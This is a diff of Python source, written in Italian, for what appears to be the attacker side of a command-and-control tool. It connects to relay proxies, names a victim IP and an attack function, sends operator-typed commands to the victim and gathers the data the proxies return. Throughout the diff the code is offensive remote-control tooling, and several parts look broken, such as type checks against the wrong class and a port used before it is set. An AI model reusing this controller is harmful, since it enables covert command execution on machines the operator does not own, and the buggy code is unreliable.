@@ -22,247 +22,270 @@ from scapy.all import *
 #directory = os.path.dirname(file_path)
 #sys.path.insert(0, directory)
 #import attacksingleton 
-from attacksingleton import * 
+from attacksingleton import *  
 
-class Methods_Analyze_Data:
-    def separa_dati_byID(received_data:dict[str,list]):
-        dati_separati:dict[str,list]=[]
-        unindent_data=[]
-        ## dati_separati={id:lista}
-        for list_data in received_data.values(): 
-            if isinstance(list_data, bytes):
-                    list_data=list_data.decode()
-            else: print(type(data))
-            for data in list_data.split("||"): 
-                unindent_data.append([x for x in data])
-        #print("unindent_data: ",unindent_data)    
-        for list_data in unindent_data:
-            #print("list_data: ",list_data)
-            #print(f"\t***{list_data}")
-            if isinstance(list_data, bytes):
-                    list_data=list_data.decode()
-            else: print(type(data))
-            list_data=list_data.split("&&")
-            if len(list_data)!=2:
-                print(f"Errore. Length is {len(list_data)}\t{list_data}")
-                continue
-            if dati_separati.get(list_data[0]) is None:
-                dati_separati.update({list_data[0]:[]}) 
-            dati_separati.get(list_data[0]).append(list_data[1]) 
-        return dati_separati
 
-    def old_separa_dati_byID(received_data:dict[str,list], dati_separati:dict[str,list]):
-        unindent_data=[]
-        ## dati_separati={id:lista}
-        for list_data in received_data.values():
-            for data in list_data:
-                if isinstance(data, bytes):
-                    data=data.decode()
-                if isinstance(data, str):
-                    data=data.split("||")
-                else: print(type(data))
-                #print("Separa: ",data) 
-                unindent_data.append([x for x in data])
-        #print("unindent_data: ",unindent_data)    
-        for list_data in unindent_data:
-            #print("list_data: ",list_data)
-            #print(f"\t***{list_data}")
-            for index in range(len(list_data)):
-                #print(f"AAAA: {index}/{len(list_data)}")
-                if not list_data[index]: 
-                    continue
-                #print(f"\t***{list_data[index]}") 
-                if isinstance(list_data[index],bytes):
-                    data=list_data[index].decode()
-                if isinstance(list_data[index],str): 
-                    data=list_data[index].split("\t")
-                #print("***DATA: ",data) 
-                if dati_separati.get(data[1]) is None:
-                    dati_separati.update({data[1]:[]}) 
-                dati_separati.get(data[1]).append(data)   
 
-    def unisciDati(dati_separati:dict[str:list]):
-        payload=[] 
-        for index in range(len(dati_separati)): 
-            #print("DATI: ",dati_separati.get(str(index))) 
-            for data in dati_separati.get(str(index)):
-                if data[2]==MSG.LAST_PACKET:
-                    continue
-                payload.append(data[2])
-        return payload
-
-class Proxy_Data: 
-    def __init__(self, proxy:ipaddress._IPAddressBase): 
-        if not IS_TYPE.ipaddress(proxy): 
-            raise TypeError("proxy non valido") 
-        self.ipaddress:ipaddress.IPv4Address=proxy 
-        self.socket:socket.socket=None 
-        self.thread:threading.Thread=None  
-        self.event:threading.Event=GET.threading_Event() 
-        self.received_data:list[str]=[] 
-
-class Connected_Proxy: 
-    def __init__(self,proxy_list:list[ipaddress._IPAddressBase]):  
-        if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
-            raise TypeError("proxy_list non valida") 
-        self.lock_connected_proxy:threading.Lock=GET.threading_Lock() 
-        self.connected_proxy:dict[str,Proxy_Data]=dict() 
-        for proxy in proxy_list:
+class DATA: 
+    class PROXY: 
+        def __init__(self, proxy:ipaddress._IPAddressBase, proxy_port:int=None): 
             if not IS_TYPE.ipaddress(proxy): 
-                #proxy_list.remove(proxy) 
-                print(f"***\t{proxy} non è un indirizzo valido")
-                continue   
-            if self.connected_proxy.get(proxy.compressed) is None:  
-                self.connected_proxy[proxy.compressed]=Proxy_Data(proxy)
-            else: 
-                print(f"Proxy {proxy} già presente")
+                raise TypeError("proxy non valido") 
+            if not IS_TYPE.integer(proxy_port) or not 1023<proxy_port<65536: 
+                raise ValueError("proxy_port non valido")
+            self.ipaddress:ipaddress.IPv4Address=proxy 
+            self.port=proxy_port
+            self.socket:socket.socket=None 
+            self.event:threading.Event=GET.threading_Event() 
+            self.data_received:list[str]=[] 
+            self.data_lock=GET.threading_Lock() 
     
-    def conn_2_proxy(self, ip_vittima:ipaddress._IPAddressBase,attack_function:AttackType): 
-        def init_socket(proxy:ipaddress._IPAddressBase): 
-            socket_proxy=None 
-            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            socket_proxy.settimeout(15) #15 secondi 
-            socket_proxy.connect((proxy.compressed, proxy_port)) 
-            #socket_proxy.connect(("192.168.56.104", 4567)) 
-            #print("SOCKET",socket_proxy) 
-            with self.lock_connected_proxy:
-                self.connected_proxy[proxy.compressed].socket=socket_proxy 
-        def send_conferma(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
-            confirm_msg=( 
-                MSG.CONFIRM_ATTACKER+"|"+ 
-                proxy.compressed+"|"+
-                ip_vittima.compressed+"|"+ 
-                MSG.ATTACK_FUNCTION+"|"+
-                attack_function.name 
-            ) 
-            #TODO implementare metodi per riprovare in caso di fallimento
-            socket_proxy.settimeout(10) 
-            socket_proxy.sendall(confirm_msg.encode()) 
-            print(f"Messaggio di conferma inviato a {proxy}") 
-            socket_proxy.settimeout(10) 
-            data=socket_proxy.recv(1024).decode() 
-            #print(f"Received from {proxy}:{data}") 
-            confirm_msg=( 
-                MSG.CONFIRM_PROXY+"|"+ 
-                proxy.compressed+"|"+
-                ip_vittima.compressed+"|"+ 
-                MSG.ATTACK_FUNCTION+"|"+
-                attack_function.name 
-            ) 
-            if not data or data!=confirm_msg:  
-                raise ValueError(f"Messaggio di conferma non valido per {proxy}") 
-        def wait_update(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
-            confirm_text=( 
-                MSG.CONFIRM_VICTIM+"|"+ 
-                ip_vittima.compressed+"|"+ 
-                proxy.compressed 
-            ) 
-            socket_proxy.settimeout(10) 
-            data_received=socket_proxy.recv(1024).decode() 
-            result=data_received.replace(confirm_text,"") 
-            #print(f"{proxy} è connesso alla vittima? {type(result)} {result}") 
-            if result!="True": 
-                raise ValueError(f"Proxy {proxy} non connesso alla vittima") 
-        def callback(proxy:ipaddress._IPAddressBase=None):  
-            try: 
-                init_socket(proxy) 
-                print(f"Connessione con {proxy} stabilita") 
-                with self.lock_connected_proxy:
-                    proxy_data=self.connected_proxy.get(proxy.compressed)
-                if not proxy_data or not proxy_data.socket or not IS_TYPE.socket(proxy_data.socket): 
-                    raise ValueError(f"Proxy {proxy} non presente o socket non inizializzato")
-                socket_proxy=proxy_data.socket  
-                send_conferma(proxy,socket_proxy) 
-                print(f"Messaggio di conferma valido per {proxy}")
-                wait_update(proxy,socket_proxy) 
-                print(f"Proxy {proxy} connesso alla vittima") 
-            except Exception as e: 
-                print(f"conn_2_proxy.callback: {e}") 
-                print(f"Connessione con {proxy} fallita") 
-                with self.lock_connected_proxy: 
-                    unusable_proxy.append(proxy) 
-        #----------------------- 
-        unusable_proxy=[] 
-        for proxy in self.connected_proxy.values():  
-            with self.lock_connected_proxy:
-                proxy.thread=threading.Thread( 
-                    #La callback controlla la connesisone fra l'attaccante ed il proxy
-                    target=callback 
-                    ,args=[proxy.ipaddress] 
-                )   
-            proxy.thread.start() 
-        for proxy in self.connected_proxy.values(): 
-            proxy.thread.join() 
-        for unusable in unusable_proxy: 
-            print("Chiusura connessione con proxy inutilizzabile: ",unusable)
-            with self.lock_connected_proxy: 
-                if self.connected_proxy[unusable.compressed].socket: 
-                    try: 
-                        self.connected_proxy[unusable.compressed].socket.sendall(MSG.END_COMMUNICATION.encode()) 
-                        self.connected_proxy[unusable.compressed].socket.close() 
-                    except Exception as e: 
-                        print("conn_2_proxy-> ",e)
-                        print(f"Errore durante la chiusura della connessione con proxy {unusable}") 
-            with self.lock_connected_proxy: 
-                if self.connected_proxy.get(unusable.compressed):
-                    self.connected_proxy.pop(unusable.compressed)
-            print(f"Rimosso proxy inutilizzabile: {unusable}") 
+    class METHODS: 
+        def invia_dati(type_separazione:Enum): 
+            def by_id(): 
+                print("Invio dati seprandoli by ID") 
+            #-------------------
+            if not IS_TYPE.enum(type_separazione, SEPARAZIONE_DATI): 
+                raise TypeError("Tipologia separazione dati non vlaida")
+            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
+                by_id() 
 
-class Get_Command_Args: 
-    def init__(self, oggetto=None): 
-        def _attaccante(): 
-            parser = argparse.ArgumentParser()
-            parser.add_argument("--file_path",type=str, help="File di configurazione")  
-            try: 
-                args,unknown =PARSER.check_arguments(parser) 
-                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
-                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
-                if not args.file_path or not IS_TYPE.string(args.file_path): 
-                    raise ValueError(f"--file_path non specificato") 
-                return args 
-            except Exception as e: 
-                print(e) 
-                PARSER.print_supported_arguments(parser) 
-            return None 
-        def _proxy(): 
-            parser = argparse.ArgumentParser()
-            parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
-            try:
-                args,unknown =PARSER.check_arguments(parser) 
-                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
-                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
-                if not args.ip_attaccante or not IS_TYPE.string(args.ip_attaccante): 
-                    raise ValueError(f"--ip_attaccante non specificato") 
-                return args 
-            except Exception as e: 
-                print(e)
-                PARSER.print_supported_arguments(parser) 
-            return None
-        def _victim(): 
-            parser = argparse.ArgumentParser()
-            parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
-            try:
-                args,unknown =PARSER.check_arguments(parser) 
-                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
-                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
-                if not args.num_proxy or not IS_TYPE.integer(args.num_proxy): 
-                    raise ValueError(f"--num_proxy non specificato") 
-                return args 
-            except Exception as e: 
-                print(e)
-                PARSER.print_supported_arguments(parser) 
-            return None 
-        #------------------------------
-        if not isinstance(oggetto,Attacker): #TODO Aggiungere or not isinstance(oggetto,Proxy) or not isinstance(oggetto,Victim):
-            raise TypeError(f"Oggetto {oggetto} non valido")
-        self.oggetto=oggetto 
-        if isinstance(self.oggetto,Attacker): 
-            return _attaccante()
-        #elif isinstance(self.oggetto,Proxy): 
-        #    return _proxy()
-        #elif isinstance(self.oggetto,Victim): 
-        #    return _victim()  
-        return None 
+        def separa_dati(type_separazione:Enum, data_received:dict[str,list]): 
+            def by_id(): 
+                print("Invio dati seprandoli by ID") 
+                dati_separati:dict[str,list]=[]
+                unindent_data=[]
+                ## dati_separati={id:lista}
+                for list_data in data_received.values(): 
+                    if isinstance(list_data, bytes):
+                            list_data=list_data.decode()
+                    else: print(type(data))
+                    for data in list_data.split("||"): 
+                        unindent_data.append([x for x in data])
+                #print("unindent_data: ",unindent_data)    
+                for list_data in unindent_data:
+                    #print("list_data: ",list_data)
+                    #print(f"\t***{list_data}")
+                    if isinstance(list_data, bytes):
+                            list_data=list_data.decode()
+                    else: print(type(data))
+                    list_data=list_data.split("&&")
+                    if len(list_data)!=2:
+                        print(f"Errore. Length is {len(list_data)}\t{list_data}")
+                        continue
+                    if dati_separati.get(list_data[0]) is None:
+                        dati_separati.update({list_data[0]:[]}) 
+                    dati_separati.get(list_data[0]).append(list_data[1]) 
+                return dati_separati 
+            def old_by_id(dati_separati:dict[str,list]): 
+                unindent_data=[]
+                ## dati_separati={id:lista}
+                for list_data in data_received.values():
+                    for data in list_data:
+                        if isinstance(data, bytes):
+                            data=data.decode()
+                        if isinstance(data, str):
+                            data=data.split("||")
+                        else: print(type(data))
+                        #print("Separa: ",data) 
+                        unindent_data.append([x for x in data])
+                #print("unindent_data: ",unindent_data)    
+                for list_data in unindent_data:
+                    #print("list_data: ",list_data)
+                    #print(f"\t***{list_data}")
+                    for index in range(len(list_data)):
+                        #print(f"AAAA: {index}/{len(list_data)}")
+                        if not list_data[index]: 
+                            continue
+                        #print(f"\t***{list_data[index]}") 
+                        if isinstance(list_data[index],bytes):
+                            data=list_data[index].decode()
+                        if isinstance(list_data[index],str): 
+                            data=list_data[index].split("\t")
+                        #print("***DATA: ",data) 
+                        if dati_separati.get(data[1]) is None:
+                            dati_separati.update({data[1]:[]}) 
+                        dati_separati.get(data[1]).append(data)
+            #-------------------
+            if not IS_TYPE.enum(type_separazione, SEPARAZIONE_DATI): 
+                raise TypeError("Tipologia separazione dati non vlaida")
+            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
+                by_id() 
+            
+        def unisci_dati(dati_separati:dict[str:list]):
+            payload=[] 
+            for index in range(len(dati_separati)): 
+                #print("DATI: ",dati_separati.get(str(index))) 
+                for data in dati_separati.get(str(index)):
+                    if data[2]==MSG.LAST_PACKET.value:
+                        continue
+                    payload.append(data[2])
+            return payload
+
+class THREAD: 
+    class PROXIES_CONECTION: 
+        def __init__(self, proxy_list:dict[str,DATA.PROXY]):
+            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
+                raise ValueError("Lista dei proxy non valida") 
+            self.thread_lock=GET.threading_Lock() 
+            self.thread_list:dict[str:threading.Thread]=dict()
+            for proxy in proxy_list.values(): 
+                self.thread_list[proxy.ipaddress.compressed]=None  
+            self.unusable_proxy:list[DATA.PROXY]=[] 
+
+        def start(self, ip_vittima:ipaddress._IPAddressBase,attack_function:AttackType, proxy_list:dict[str,DATA.PROXY]): 
+            def callback(proxy_data:DATA.PROXY=None): 
+                try: 
+                    set_connessione(proxy_data) 
+                    if not IS_TYPE.socket(proxy_data.socket): 
+                        raise ValueError(f"Proxy {proxy_data.ipaddress} socket non inizializzato")
+                    send_conferma(proxy_data) 
+                    print(f"Messaggio di conferma valido per {proxy_data.ipaddress}")
+                    wait_risposta(proxy_data) 
+                    print(f"Proxy {proxy_data.ipaddress} connesso alla vittima") 
+                except Exception as e: 
+                    print(f"PROXIES_CONECTION.callback: {e}") 
+                    print(f"Connessione con {proxy_data.ipaddress} fallita") 
+                    with self.thread_lock: 
+                        self.unusable_proxy.append(proxy_data)  
+            def set_connessione(proxy:DATA.PROXY=None): 
+                socket_proxy=None 
+                socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                socket_proxy.settimeout(15) #15 secondi 
+                socket_proxy.connect((proxy.ipaddress.compressed, proxy.port)) 
+                with self.thread_lock: 
+                    proxy.socket=socket_proxy 
+                print(f"Connessione con {proxy.ipaddress} stabilita") 
+            def send_conferma(proxy:DATA.PROXY): 
+                confirm_msg=( 
+                    MSG.CONFIRM_ATTACKER.value+"|"+ 
+                    proxy.ipaddress.compressed+"|"+
+                    ip_vittima.compressed+"|"+ 
+                    MSG.ATTACK_FUNCTION.value+"|"+
+                    attack_function.name 
+                ) 
+                #TODO implementare metodi per riprovare in caso di fallimento
+                proxy.socket.settimeout(10) 
+                proxy.socket.sendall(confirm_msg.encode()) 
+                print(f"Messaggio di conferma inviato a {proxy}") 
+                data=""
+                while True:
+                    proxy.socket.settimeout(10) 
+                    chunk=proxy.socket.recv(1024).decode() 
+                    if not chunk: break
+                    data+=chunk
+                    if MSG.END_SOCKETSEND.value in data: 
+                        data=data.replace(MSG.END_SOCKETSEND.value,"")
+                        break 
+                confirm_msg=( 
+                    MSG.CONFIRM_PROXY.value+"|"+ 
+                    proxy.ipaddress.compressed+"|"+
+                    ip_vittima.compressed+"|"+ 
+                    MSG.ATTACK_FUNCTION.value+"|"+
+                    attack_function.name 
+                ) 
+                if not data or data!=confirm_msg:  
+                    raise ValueError(f"Messaggio di conferma non valido per {proxy}") 
+            def wait_risposta(proxy:DATA.PROXY): 
+                confirm_text=( 
+                    MSG.CONFIRM_VICTIM.value+"|"+ 
+                    ip_vittima.compressed+"|"+ 
+                    proxy.ipaddress.compressed 
+                ) 
+                data=""
+                while True:
+                    proxy.socket.settimeout(10) 
+                    chunk=proxy.socket.recv(1024).decode()  
+                    if not chunk: break
+                    data+=chunk
+                    if MSG.END_SOCKETSEND.value in data: 
+                        data=data.replace(MSG.END_SOCKETSEND.value,"")
+                        break
+                result=data.replace(confirm_text,"") 
+                #print(f"{proxy} è connesso alla vittima? {type(result)} {result}") 
+                if result!="True": 
+                    raise ValueError(f"Proxy {proxy} non connesso alla vittima") 
+            def pop_proxy_inutilizzati(): 
+                for proxy in self.unusable_proxy: 
+                    try: 
+                        proxy.socket.sendall(MSG.END_COMMUNICATION.value.encode()) 
+                        proxy.socket.close() 
+                        print(f"Connessione con {proxy.ipaddress} chiusa")
+                    except Exception as e: 
+                        print("PROXIES_CONECTION.start-> ",e) 
+                        print(f"Errore durante la chiusura della connessione con {proxy.ipaddress}") 
+                    with self.thread_lock:  
+                        if proxy_list.get(proxy.ipaddress.compressed):
+                            proxy_list.pop(proxy.ipaddress.compressed)
+                            print(f"{proxy.ipaddress} rimosso...") 
+                        else: print(f"{proxy.ipaddress} non rimosso...") 
+            #----------------------- 
+            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
+                raise ValueError("Lista dei proxy non valida") 
+            if not IS_TYPE.ipaddress(ip_vittima): 
+                raise TypeError("IP vittima non valido") 
+            if not IS_TYPE.enum(attack_function, AttackType): 
+                raise TypeError("Metodo attacco non valido") 
+            for key in self.thread_list.keys(): 
+                with self.thread_lock:
+                    self.thread_list[key]=threading.Thread( 
+                        #La callback controlla la connesisone fra l'attaccante ed il proxy
+                        target=callback 
+                        ,args=[proxy_list[key]] 
+                    ) 
+                    self.thread_list[key].name=f"Thread-Connect-{key}" 
+                self.thread_list[key].start() 
+            for thread in self.thread_list.values(): 
+                thread.join() 
+            print("Chiusura della connessione con proxy inutilizzabili")
+            pop_proxy_inutilizzati()
+
+    class WAIT_DATA:
+        def __init__(self, proxy_list:dict[str,DATA.PROXY]): 
+            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
+                raise ValueError("Lista dei proxy non valida") 
+            self.thread_lock=GET.threading_Lock() 
+            self.thread_list:dict[str:threading.Thread]=dict() 
+            self.thread_response:dict[str:threading.Thread]=dict() 
+            for proxy in proxy_list.values(): 
+                self.thread_list[proxy.ipaddress.compressed]=None  
+                self.thread_response[proxy.ipaddress.compressed]=False  
+        
+        def start(self, proxy_list:dict[str,DATA.PROXY]): 
+            def callback(proxy_data:DATA.PROXY):  
+                if not isinstance(proxy_data, DATA.PROXY):
+                    print(f"THREAD.WAIT_DATA: proxy {proxy_data} non valido")
+                    return 
+                data=""
+                while True:  
+                    chunk=proxy_data.socket.recv(1024) 
+                    print(f"Received from {proxy_data.ipaddress}:\t{chunk.decode()}")
+                    if not chunk:
+                        break
+                    data+=chunk.decode() 
+                    if MSG.END_SOCKETSEND.value in data: 
+                        data=data.replace(MSG.END_SOCKETSEND.value,"")
+                        with proxy_data.data_lock: 
+                            proxy_data.data_received.append(data) 
+                        if MSG.LAST_PACKET.value not in data: 
+                            data="" 
+                    if MSG.LAST_PACKET.value in data: 
+                        data=data.replace(MSG.LAST_PACKET.value,"") 
+                        with proxy_data.data_lock: 
+                            proxy_data.data_received.append(data)
+                        break 
+            #-------------------------------
+            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
+                raise ValueError("Lista dei proxy non valida") 
+            for key in self.thread_list.keys(): 
+                with self.thread_lock:
+                    self.thread_list[key]=threading.Thread(
+                        target=callback, 
+                        args=[proxy_list[key]]
+                    ) 
+                    self.thread_list[key].name=f"Thread-WaitData-{proxy_list[key].ipaddress.compressed}" 
+                    self.thread_list[key].start()  
+            print("Definiti e avviati i thread che aspettano i dati dai proxy") 
 
 class MSG_CONFIG(Enum): 
     attack_method="attack_function" 
@@ -316,13 +339,26 @@ class ICMP_THREAD:
         for thread in self.thread_list.values():
             #thread.wait()  
             thread.join()  
-        print("Thread ICMP terminati")
+        print("Thread ICMP terminati") 
 
-class Get_Config_Args: 
-    default_file_path:str = "./attack_file.json" 
+class ARGS_CONFIG:
+    class FROM_FILE: 
+        default_file_path:str="./attack_file.json" 
 
-    def __init__(self, file_path:str=None):
-        def load_config_file(path_of_file): 
+        def __init__(self, file_path:str=None): 
+            self.config_file=None 
+            if IS_TYPE.string(file_path) and file_path.endswith(".json"): 
+                try: 
+                    self.config_file=ARGS_CONFIG.FROM_FILE.load_file(file_path) 
+                    pass
+                except Exception as e: 
+                    print(e) 
+            if not self.config_file:
+                self.config_file=ARGS_CONFIG.FROM_FILE.load_file(self.default_file_path) 
+        
+        def load_file(path_of_file:str):
+            if not IS_TYPE.string(path_of_file): 
+                raise TypeError(f"File path {path_of_file} non valido") 
             if not os.path.exists(path_of_file): 
                 raise FileNotFoundError(f"File {path_of_file} non presente")
             if not str(path_of_file).endswith(".json"): 
@@ -330,31 +366,35 @@ class Get_Config_Args:
             with open(path_of_file, 'r') as file: 
                 print(f"File di configurazione {path_of_file} caricato correttamente") 
                 return json.load(file) 
-        def get_vittima(): 
+        
+        def get_vittima(self): 
             try:
-                ip_vittima=config_file.get("ip_vittima", None) 
+                ip_vittima=self.config_file.get("ip_vittima", None) 
                 return ipaddress.ip_address(ip_vittima) 
             except Exception as e:
                 print(f"get_vittima: {e}") 
                 return None 
-        def get_proxy_list():  
+        
+        def get_proxy_list(self):  
             proxy_list:list[ipaddress._IPAddressBase]=[]
-            for ip_proxy in config_file.get("proxy_list", []): 
+            for ip_proxy in self.config_file.get("proxy_list", []): 
                 try:
                     proxy_ip=ipaddress.ip_address(ip_proxy)
                     proxy_list.append(proxy_ip) 
                 except Exception as e:
                     print(f"get_proxy_list: {e}") 
-            return proxy_list if len(proxy_list)>0 else None
-        def get_attacco(): 
-            attack_type=AttackType.get_attack_method(config_file.get("attack_function")) 
+            return proxy_list if len(proxy_list)>0 else None 
+        
+        def get_attacco(self): 
+            attack_type=AttackType.get_attack_method(self.config_file.get("attack_function")) 
             for count in range(3):
                 if IS_TYPE.enum(attack_type,AttackType): 
                     return attack_type 
                 attack_type=AttackType.choose_attack_function() 
             #raise TypeError("Attacco non valido:",attack_type) 
-            return None
-        def get_ip_host(): 
+            return None 
+        
+        def get_ip_host(self): 
             ip_host, errore=NETWORK.IP.find_local_IP() 
             if errore:
                 print("errore:",errore)  
@@ -371,8 +411,9 @@ class Get_Config_Args:
                     msg="Inserire indirizzo IP dell'host:\n\t#" 
                     ip_host=input(msg) 
             return None 
-        def get_proxy_port(): 
-            proxy_port=int(config_file.get("proxy_port", None) )
+        
+        def get_proxy_port(self): 
+            proxy_port=int(self.config_file.get("proxy_port", None) )
             for count in range(3):
                 if IS_TYPE.integer(proxy_port) and 0<proxy_port<65536: 
                     return proxy_port 
@@ -380,8 +421,9 @@ class Get_Config_Args:
                 msg="Inserire porta proxy (0-65535):\n\t#"
                 proxy_port=int(input(msg)) 
             return None
-        def get_num_proxy(): 
-            num_proxy=int(config_file.get("num_proxy", None) )
+        
+        def get_num_proxy(self): 
+            num_proxy=int(self.config_file.get("num_proxy", None) )
             for count in range(3):
                 if IS_TYPE.integer(num_proxy) and 0<num_proxy<100: 
                     return num_proxy 
@@ -389,139 +431,174 @@ class Get_Config_Args:
                 msg="Inserire numero proxy (1-100):\n\t#"
                 num_proxy=int(input(msg)) 
             return None
-        #---------------------------
-        config_file=None
-        if IS_TYPE.string(file_path) and file_path.endswith(".json"): 
-            try: 
-                #config_file=load_config_file(file_path) 
-                pass
-            except Exception as e: 
+        
+    class FROM_COMMAND:
+        def __init__(self, entita:EntityEnum=None): 
+            def _attaccante()->argparse.Namespace: 
+                parser.add_argument("--file_path",type=str, help="File di configurazione")  
+                args,unknown =PARSER.check_arguments(parser) 
+                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
+                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
+                if not args.file_path or not IS_TYPE.string(args.file_path): 
+                    raise ValueError(f"--file_path non specificato") 
+                return args  
+            def _proxy()->argparse.Namespace: 
+                parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
+                args,unknown =PARSER.check_arguments(parser) 
+                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
+                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
+                if not args.ip_attaccante or not IS_TYPE.string(args.ip_attaccante): 
+                    raise ValueError(f"--ip_attaccante non specificato") 
+                return args  
+            def _victim()->argparse.Namespace:  
+                parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
+                args,unknown =PARSER.check_arguments(parser) 
+                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
+                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
+                if not args.num_proxy or not IS_TYPE.integer(args.num_proxy): 
+                    raise ValueError(f"--num_proxy non specificato") 
+                return args  
+            #---------------------
+            if not IS_TYPE.enum(entita, EntityEnum): 
+                raise TypeError(f"Entità {entita} non valida") 
+            #self.entita=entita 
+            parser = argparse.ArgumentParser() 
+            try:
+                if entita==EntityEnum.ATTACKER: 
+                    self.args=_attaccante() 
+                elif entita==EntityEnum.VICTIM: 
+                    self.args=_victim()
+                elif entita==EntityEnum.PROXY: 
+                    self.args=_proxy() 
+            except Exception as e:
                 print(e) 
-        if not config_file:
-            config_file=load_config_file(self.default_file_path) 
-        self.ip_vittima=get_vittima() 
-        self.proxy_list=get_proxy_list()
-        self.attack_type=get_attacco() 
-        self.ip_host=get_ip_host() 
-        self.proxy_port=get_proxy_port()
-        self.num_proxy=get_num_proxy()  
+                #parser.print_help() 
+                PARSER.print_supported_arguments(parser) 
+            self.args=None 
+
 
 class Attacker: 
-    dati_separati={} 
-    connected_proxy:Connected_Proxy=None 
-
-    attack_type:AttackType=None
-    ip_vittima:ipaddress._IPAddressBase=None
-    ip_host:ipaddress._IPAddressBase=None
+    def __init__(self, config_args:ARGS_CONFIG.FROM_FILE): 
+        if not isinstance(config_args, ARGS_CONFIG.FROM_FILE):
+            raise TypeError("config_args non valido")
+        self.ip_vittima=config_args.ip_vittima 
+        self.ip_host=config_args.ip_host 
+        self.attack_type=config_args.attack_type 
+        self.lock_proxy_list:threading.Lock=GET.threading_Lock() 
+        self.proxy_list:dict[str,DATA.PROXY]=dict() 
+        for proxy in config_args.proxy_list : 
+            if not IS_TYPE.ipaddress(proxy): 
+                #proxy_list.remove(proxy) 
+                print(f"\t{proxy} non è un indirizzo valido") 
+                continue 
+            if not self.proxy_list.get(proxy.compressed): 
+                self.proxy_list[proxy.compressed]=DATA.PROXY(proxy,self.proxy_port) 
+        self.proxy_port=config_args.proxy_port 
+        self.dati_ricevuti={} 
     
-    def __init__(self):  
-        args=Get_Command_Args().args   
-        if not IS_TYPE.namespace(args): 
-            exit(-1)  
-        if not IS_TYPE.string(args.file_path):
-            config_args=Get_Config_Args(args.file_path) 
-        else: config_args=Get_Config_Args(None) 
-        self.connected_proxy=Connected_Proxy(config_args.proxy_list) 
+    def start(self): 
+        def send_command(): 
+            chosen_proxy=random.choice(self.proxy_list.values()) 
+            if not isinstance(chosen_proxy, DATA.PROXY): 
+                raise TypeError("Proxy non DATA.PROXY") 
+            print(f"Il comando verrà mandato al proxy {chosen_proxy}") 
+            with self.lock_proxy_list: 
+                socket= self.proxy_list[chosen_proxy.ipaddress.compressed].socket
+            messaggio=(
+                MSG.CONFIRM_COMMAND.value+
+                command+
+                MSG.END_SOCKETSEND.value
+            )
+            socket.sendall(messaggio.encode()) 
+            print(f"Gli altri proxy ascolteranno direttamente la vittima")
+            for proxy in self.proxy_list.values(): 
+                if proxy.ipaddress.compressed==chosen_proxy.ipaddress.compressed:
+                    continue 
+                with self.lock_proxy_list:
+                    socket= self.proxy_list[proxy.ipaddress.compressed].socket
+                socket.sendall(MSG.WAIT_DATA.value.encode())  
+        def get_received_data(): 
+            received_data=[]
+            with self.lock_proxy_list: 
+                for proxy in self.proxy_list.values(): 
+                    with proxy.data_lock: 
+                        received_data.extend(proxy.data_received) 
+            return received_data 
+        def reset_variables(): 
+            self.thread_list={}
+            self.dati_separati={}
+            self.data_received:dict[str,list]={}
+            for proxy in self.proxy_list: 
+                if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
+                    print(f"***\t{proxy} non è un indirizzo valido")
+                    continue
+                self.data_received.update({proxy.compressed:[]}) 
+                thread=threading.Thread(
+                    target=self.wait_data_from_proxy 
+                    ,args=[proxy]
+                )
+                thread.name=f"Thread-{proxy.compressed}"
+                self.thread_list.update({proxy.compressed:thread})
+            for proxy in self.proxy_list:
+                self.event_thread_update.get(proxy.compressed).clear() 
+            for thread in self.thread_list.values():
+                thread.start() 
+            #if want_to_choose_new_attack():
+            #    self.attack_function=choose_new_attack() 
+            #if want_to_choose_new_victim:
+            #   self.ip_vittima= choose_new_victim()  
+        #------------------------ 
+        self.thread_proxiesConnection=THREAD.PROXIES_CONECTION(self.proxy_list, self.proxy_port, self.lock_proxy_list) 
+        self.thread_proxiesConnection.start(
+            self.ip_vittima,self.attack_type
+        )  
         print(f"Got all connected proxy") 
-        if len(self.connected_proxy.proxy_list)<=0: 
+        if len(self.proxy_list)<=0: 
             print("Nessun Proxy disponibile")
             exit(0) 
-        self.connected_proxy.connect2proxies(
-            config_args.ip_vittima,config_args.attack_type
-        )
-        #thread_list=connected_proxy.Proxy_Thread
-        #dict_proxy_socket=connected_proxy.Proxy_Socket 
-    
-    def send_command_to_victim(self): 
-        self.data_lock=GET.threading_Lock() 
-        self.icmp_thread=ICMP_THREAD(self.connected_proxy.proxy_list, self.wait_proxy_update) #thread_lock, thread_proxy_response, thread_list
-        self.event_received_data=GET.threading_Event() 
-        self.icmp_thread.start_Thread() 
+        self.thread_waitData=THREAD.WAIT_DATA(self.proxy_list) 
+        self.thread_waitData.start(self.proxy_list) 
         msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
         command=input(msg) 
         while command.lower() not in exit_cases: 
-            print(f"Il comando immesso è: {command}")
-            try:
